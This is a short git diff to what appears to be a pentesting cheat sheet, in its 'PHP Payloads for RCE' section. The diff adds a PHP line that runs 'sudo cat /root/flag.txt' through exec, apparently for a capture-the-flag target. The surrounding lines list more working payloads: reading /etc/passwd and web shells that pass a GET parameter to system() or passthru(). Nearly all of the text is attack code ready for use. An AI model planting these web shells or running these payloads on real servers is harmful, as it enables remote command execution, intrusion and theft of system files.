@@ -193,6 +193,7 @@ Here is a h1 POC: [Upload profile photo from URL](https://hackerone.com/reports/
 ### **10. PHP Payloads for RCE**
 
 ```php
+<?php echo exec('sudo cat /root/flag.txt'); ?> // Execute command and give output
 <?php echo file_get_contents('/etc/passwd'); ?> // To read files
 <?php system($_GET['cmd']); ?> // For system command
 <?php passthru($_GET['cyborg71']); ?> // For system command*
